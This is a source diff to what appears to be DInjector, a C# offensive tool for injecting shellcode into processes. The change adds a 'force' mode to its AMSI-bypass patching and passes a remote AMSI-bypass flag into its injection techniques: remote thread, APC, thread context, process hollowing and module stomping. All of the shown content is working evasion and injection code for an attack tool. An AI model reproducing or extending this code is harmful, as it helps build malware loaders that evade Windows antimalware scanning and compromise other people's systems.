@@ -90,8 +90,14 @@ namespace DInjector
             // Bypass AMSI (current process)
             try
             {
-                if (bool.Parse(options["/am51"]))
-                    AM51.Patch();
+                bool localAm51 = false, forceLocalAm51 = false;
+                if (options["/am51"].ToUpper() == "FORCE")
+                    localAm51 = forceLocalAm51 = true;
+                else if (bool.Parse(options["/am51"]))
+                    localAm51 = true;
+
+                if (localAm51)
+                    AM51.Patch(force: forceLocalAm51);
             }
             catch (Exception)
             { }
@@ -140,10 +146,12 @@ namespace DInjector
             catch (Exception)
             { }
 
-            var remoteAm51 = false;
+            bool remoteAm51 = false, forceRemoteAm51 = false;
             try
             {
-                if (bool.Parse(options["/remoteAm51"]))
+                if (options["/remoteAm51"].ToUpper() == "FORCE")
+                    remoteAm51 = forceRemoteAm51 = true;
+                else if (bool.Parse(options["/remoteAm51"]))
                     remoteAm51 = true;
             }
             catch (Exception)
@@ -221,7 +229,8 @@ namespace DInjector
                         RemoteThread.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
-                            remoteAm51);
+                            remoteAm51,
+                            forceRemoteAm51);
                         break;
 
                     case "remotethreaddll":
@@ -229,14 +238,16 @@ namespace DInjector
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
                             options["/dll"],
-                            remoteAm51);
+                            remoteAm51,
+                            forceRemoteAm51);
                         break;
 
                     case "remotethreadview":
                         RemoteThreadView.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
-                            remoteAm51);
+                            remoteAm51,
+                            forceRemoteAm51);
                         break;
 
                     case "remotethreadsuspended":
@@ -250,7 +261,8 @@ namespace DInjector
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
                             flipSleep,
-                            remoteAm51);
+                            remoteAm51,
+                            forceRemoteAm51);
                         break;
 
                     case "remotethreadkernelcb":
@@ -258,7 +270,8 @@ namespace DInjector
                             shellcodeBytes,
                             options["/image"],
                             ppid,
-                            blockDlls);
+                            blockDlls,
+                            remoteAm51);
                         break;
 
                     case "remotethreadapc":
@@ -266,7 +279,8 @@ namespace DInjector
                             shellcodeBytes,
                             options["/image"],
                             ppid,
-                            blockDlls);
+                            blockDlls,
+                            remoteAm51);
                         break;
 
                     case "remotethreadcontext":
@@ -274,7 +288,8 @@ namespace DInjector
                             shellcodeBytes,
                             options["/image"],
                             ppid,
-                            blockDlls);
+                            blockDlls,
+                            remoteAm51);
                         break;
 
                     case "processhollowing":
@@ -282,7 +297,8 @@ namespace DInjector
                             shellcodeBytes,
                             options["/image"],
                             ppid,
-                            blockDlls);
+                            blockDlls,
+                            remoteAm51);
                         break;
 
                     case "modulestomping":
@@ -292,7 +308,8 @@ namespace DInjector
                             options["/stompDll"],
                             options["/stompExport"],
                             ppid,
-                            blockDlls);
+                            blockDlls,
+                            remoteAm51);
                         break;
                 }
             }
@@ -311,7 +328,7 @@ namespace DInjector
             if (!SleepCheck())
                 return "(Detonator) [-] Failed sleep check\n";
 
-            var args = command.Split();
+            var args = command.Split() ;
             var options = ArgumentParser.Parse(args);
 
             // Stolen from Rubeus: https://github.com/GhostPack/Rubeus/blob/493b8c72c32426db95ffcbd355442fdb2791ca25/Rubeus/Program.cs#L75-L93
